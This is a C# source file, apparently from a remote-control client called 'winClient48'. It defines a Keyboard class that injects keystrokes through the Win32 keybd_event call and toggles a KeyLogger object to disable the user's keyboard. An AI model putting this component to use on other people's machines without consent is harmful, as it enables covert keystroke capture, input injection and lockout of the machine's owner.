using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public class Keyboard
    {
        private bool shift_press = false;
        private KeyLogger keylogger;

        public Keyboard()
        {
            if (keylogger == null)
                keylogger = new KeyLogger();
        }

        [DllImport("user32.dll")]
        private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

        private const int KEYEVENTF_EXTENDEDKEY = 1;
        private const int KEYEVENTF_KEYUP = 2;

        public void KeyDown(Keys vk)
        {
            if (vk == Keys.Shift)
            {
                shift_press = true;
            }

            keybd_event((byte)vk, 0, KEYEVENTF_EXTENDEDKEY, 0);
        }

        public void KeyUp(Keys vk)
        {
            keybd_event((byte)vk, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        }

        public void Enable()
        {
            keylogger.disable_keyboard = false;
        }

        public void Disable()
        {
            keylogger.disable_keyboard = true;
        }

        public void SmileKey(bool enable)
        {
            keylogger.smile_key = enable;
        }
    }
}
